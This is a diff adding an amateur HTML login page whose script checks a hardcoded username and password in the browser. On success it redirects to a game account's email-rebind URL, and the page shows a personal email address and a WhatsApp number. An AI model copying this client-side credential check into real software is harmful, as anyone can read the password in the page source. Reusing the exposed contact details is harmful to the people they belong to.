@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 500px;
+            height: 300px;
+        }
+        h2 {
+            margin-top: 0;
+            font-size: 24px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .input-group input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+        }
+        .btn {
+            background: #0877ee;
+            color: #fff6f6;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .btn:hover {
+            background: #0056b3;
+        }
+
+        .whatsapp-icon {
+            display: flex;
+            width: 30px;
+            height: 30px;
+            background-color: #ff0000;
+            border-radius: 50%;
+            text-align: justify;
+            line-height: 50px;
+            color: white;
+            font-size: 24px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .whatsapp-icon:hover {
+            background-color: #128C7E;
+        }
+
+        .whatsapp-icon i {
+            font-size: 28px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login & di buat oleh Abiyy (wv4e)</h2>
+        <div id="login-form">
+            <div class="input-group">
+                <label for="username">UserName</label>
+                <input type="text" id="username" placeholder="Enter your username">
+                <div id="username-error" class="error"></div>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password">
+                <div id="password-error" class="error">
+                
+                </div>
+            </div>
+            <button class="btn" onclick="validateLogin()">Login</button>
+        </div>
+    </div>
+
+    <script>
+        function validateLogin() {
+            // Clear previous errors
+            document.getElementById('username-error').textContent = '';
+            document.getElementById('password-error').textContent = '';
+
+            // Get input values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Simple validation
+            let valid = true;
+            if (username !== 'wv4e') {
+                document.getElementById('username-error').textContent = 'Invalid UserName';
+                valid = false;
+            }
+            if (password !== 'subscribe2') {
+                document.getElementById('password-error').textContent = 'Invalid password';
+                valid = false;
+            }
+
+            // If valid, redirect to another page
+            if (valid) {
+                alert('Login successful');
+                // Redirect to another page (replace 'homepage.html' with your actual target page)
+                window.location.href = 'https://mtacc.mobilelegends.com/v2.1/inapp/changebind-page?code=Jsjs&email=Abiyysiseoul%40gmail.com&guid=&type=email'; 
+            }
+        }
+    </script>
+      <a href="https://wa.me/+6285942843190" class="whatsapp-icon" target="_blank">
+        <i class="fab fa-whatsapp"></i>
+    </a>
+
+    <!-- Font Awesome CDN for WhatsApp icon -->  <-- klik di sini untuk mendapatkan username dan password
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"> </scrip>
+    
+</body>
+</html>
